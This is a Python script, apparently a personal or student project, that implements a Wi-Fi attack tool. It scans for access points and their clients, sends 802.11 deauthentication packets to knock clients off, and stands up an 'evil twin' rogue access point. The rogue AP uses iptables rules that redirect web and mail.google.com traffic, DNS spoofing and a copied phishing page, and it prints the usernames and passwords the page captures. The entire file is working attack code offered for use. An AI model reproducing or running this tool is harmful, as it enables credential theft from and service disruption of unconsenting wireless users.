#!/usr/bin/env python
from scapy.all import *
from prettytable import PrettyTable
import time
from threading import *
import subprocess

ap_specific = ""
x = PrettyTable()


# start monitor mode for the selected interface
def start_mon_mode(interface):
    try:
        os.system('ifconfig %s down' % interface)
        os.system('ip link set %s name wlan0mon' % interface)
        os.system('iwconfig wlan0mon mode monitor')
        os.system('ifconfig wlan0mon up')
    except Exception:
        sys.exit('[' + R + '-' + W + '] Could not start monitor mode')


# set tables for the AP's and clients using prretytable for more convinience
def restart_table_and_set(i):
    global devices
    devices = set()
    global x
    x = PrettyTable()
    if i == 0:
        # AP's
        x.field_names = [" ", "AP MAC", "CHANNEL", "SSID"]  # add channel
        x.title = "All Access Point: "
    else:
        # Clients
        x.field_names = [" ", "Client"]
        x.title = "Clients of %s:", ap_specific


# starting fake AP using hostapd
def startAP(essid, mac, channel):
    os.system("hostapd hostapd.conf &")


# start dhcp to allow internet connection to the evil twin using dnsmasq
# uses dnsmasq.conf
def startDHCP():
    os.system("ifconfig wlan0mon up 192.168.1.1 netmask 255.255.255.0")
    os.system("route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1")
    os.system("dnsmasq -C dnsmasq.conf -d &")


# set the iptable to enable network forwarding to the new AP
########################################
def iptableConf():
    os.system("iptables --table nat --append POSTROUTING --out-interface etho --j MASQUERADE")
    # os.system("iptables --append FORWARD --match string --algo kmp --hex-string '|c0 a8 01 5a|' --jump DROP")
    os.system("iptables --append FORWARD --in-interface wlan0mon --j ACCEPT")
    os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j NETMAP --to 192.168.1.1")
    os.system("iptables -t nat -A PREROUTING -p tcp -d mail.google.com --dport 443 -j NETMAP --to 192.168.1.1")
    os.system("iptables -t nat -A POSTROUTING -j MASQUERADE")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("iptables config completed")


# stop all of the proccesec and reset the interfaces
def stopAP(interface):
    os.system("killall dnsmasq")
    os.system("killall hostapd")
    # os.system("killall tcpflow")
    os.system("ifconfig wlan0mon down")
    os.system('ip link set wlan0mon name %s' % interface)
    # os.system("ip link delete %s" % interface)
    os.system('ifconfig %s up' % interface)
    os.system("service NetworkManager restart")
    os.system("service wpa_supplicant restart")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    os.system("iptables --flush")
    os.system("iptables --flush --table nat")
    os.system("iptables --delete-chain")
    os.system("iptables --table nat --delete-chain")
    os.system('systemctl stop apache2')


# function for AP detection
# checks if the packet is from AP using the type and subtype.
def callback_AP(pkt):
    if pkt.haslayer(Dot11Beacon) and pkt.type == 0 and pkt.subtype == 8:
        if pkt.addr2 and (pkt.addr2 not in devices):
            devices.add(pkt.addr2)
            ap_mac = pkt.addr2
            try:
                channel = str(ord(pkt[Dot11Elt:3].info))
            except:
                channel = str(ord(pkt[Dot11Elt:4].info))

            info = pkt.info.decode('UTF-8')
            type = pkt.getlayer(Dot11).payload.name
            x.add_row([len(devices), ap_mac, channel, info])  # add channel
            os.system("clear")
            print(x)


# function for detecting clients for the specific AP.
# Management = 1, data = 2 indicates the package is from client
def callback_client(pkt):
    if pkt.type in [1, 2]:
        # print("test")
        if pkt.addr1 == ap_specific and (pkt.addr2 not in devices):
            devices.add(pkt.addr2)
            type = pkt.getlayer(Dot11).payload.name
            x.add_row([len(devices), pkt.addr2])
            os.system("clear")
            print(x)


# performing Deauthentication attack - sends the deauth packet accoreding the attack length
def send_da_packet(ap_specific, client, attack_length, interface):
    # building deauth packet
    dot11 = Dot11(addr1=client, addr2=ap_specific, addr3=ap_specific)
    packet = RadioTap() / dot11 / Dot11Deauth()
    # send the packet
    sendp(packet, inter=0.2, count=attack_length, iface=interface, verbose=1)


def Eviltwin(ssid, ap, channel):  # call all of the functions needed for evil twin
    tag = False
    startAP(ssid, ap, channel)
    time.sleep(5)
    startDHCP()
    time.sleep(4)
    iptableConf()
    time.sleep(2)
    installPage()
    tag = True
    while tag:
        inp = input("")
        if inp == 'p':
            if os.stat("/var/www/html/usernames.txt").st_size != 0:
                log = open("/var/www/html/usernames.txt", "r")
                for line in log:
                    print(line)
        if inp == 'q':
            tag = False
            os.system('cp /var/www/html/usernames.txt usernames.txt')
            os.system('rm -rf /var/www/html/*')
            os.system('mv temp/* /var/www/html/')


# time.sleep(300)
# run deauth and evil twin
def ETdeauth(ssid, ap, channel, ap_specific, client):
    startAP(ssid, ap, channel)
    time.sleep(5)
    startDHCP()
    time.sleep(4)
    iptableConf()
    time.sleep(2)
    installPage()
    send_da_packet(ap_specific, client, 150, "wlan0mon")
    tag = True
    while tag:
        inp = input("")
        if inp == 'p':
            if os.stat("/var/www/html/usernames.txt").st_size != 0:
                log = open("/var/www/html/usernames.txt", "r")
                for line in log:
                    print(line)
        if inp == 'q':
            tag = False
            os.system('cp /var/www/html/usernames.txt usernames.txt')
            os.system('rm -rf /var/www/html/*')
            os.system('mv temp/* /var/www/html/')


def APscan():
    restart_table_and_set(0)
    chans = [1, 6, 11]
    i = 0
    time_delta = datetime.now()
    # scanning for AP's using the callback_AP function
    while True:
        os.system("iwconfig wlan0mon channel " + str(chans[i]))
        i = (i + 1) % len(chans)
        sniff(iface="wlan0mon", prn=callback_AP, timeout=3)
        if (time_delta - datetime.now()).total_seconds() <= -10:
            break

    select_AP = int(input("select AP number to attack: "))
    row = x[select_AP - 1]
    row.border = False
    row.header = False
    ap_specific = row.get_string(fields=["AP MAC"]).strip()
    channel = row.get_string(fields=["CHANNEL"]).strip()
    # ssid = row.get_string(fields=["SSID"]).strip()
    ssid = "Test123"
    os.system("iwconfig wlan0mon channel " + str(channel))  # changing the channel to the selected one
    return ap_specific, channel, ssid


def Clientscan():
    restart_table_and_set(2)
    time_delta = datetime.now()
    # scans for clients using Callback_client function
    while True:
        sniff(iface="wlan0mon", prn=callback_client, timeout=3)
        if (time_delta - datetime.now()).total_seconds() <= -10:
            break
    select_AP = int(input("select client number to attack: "))
    row = x[select_AP - 1]
    row.border = False
    row.header = False
    client = row.get_string(fields=["Client"]).strip()
    return client


def installPage():
    os.system('cp -R /var/www/html/ /temp')
    os.system('rm -rf /var/www/html/*')
    os.system('cp -R rogueap/* /var/www/html/')
    os.system('chmod 0777 /var/www/html/usernames.txt')
    os.system('systemctl start apache2')
    os.system('dnsspoof -i wlan0mon &')
    # os.system('tcpflow -i any -C -g port 80 &')
    # os.system('tcpflow -i any -C -g port 80 | grep -i “Password” --line-buffered  > tcpflow.log & ')


def main():
    interface = sys.argv[1]
    # check and install dependencies
    os.system('sh dep.sh')
    start_mon_mode(interface)

    global ap_specific
    os.system('clear')
    print("wellcome choose your attack")
    print("1.Evil twin + deauthentication")
    print("2.deauthentication")
    print("3.Evil Twin\n")
    text = input("")

    if text == '1':
        # choose AP and channel to attack
        ap_specific, channel, ssid = APscan()
        # choose client to attack
        client = Clientscan()
        # creating evil twin
        hostapdString = "interface=wlan0mon\ndriver=nl80211\nssid=" + ssid + "\nhw_mode=g\nchannel=" + channel + "\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0"
        print("Configuring Hostapd...")
        file = open("hostapd.conf", "w")
        file.write(hostapdString)
        file.close()
        ETdeauth(ssid, str(RandMAC()), channel, ap_specific, client)
        stopAP(interface)
    elif text == '2':
        ap_specific, channel, ssid = APscan()
        client = Clientscan()
        send_da_packet(ap_specific, client, 150, "wlan0mon")
        stopAP(interface)
    elif text == '3':
        ap_specific, channel, ssid = APscan()
        hostapdString = "interface=wlan0mon\ndriver=nl80211\nssid=" + ssid + "\nhw_mode=g\nchannel=" + channel + "\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0"
        print("Configuring Hostapd...")
        file = open("hostapd.conf", "w")
        file.write(hostapdString)
        file.close()
        Eviltwin(ssid, str(RandMAC()), channel)
        stopAP(interface)


if __name__ == "__main__":
    main()
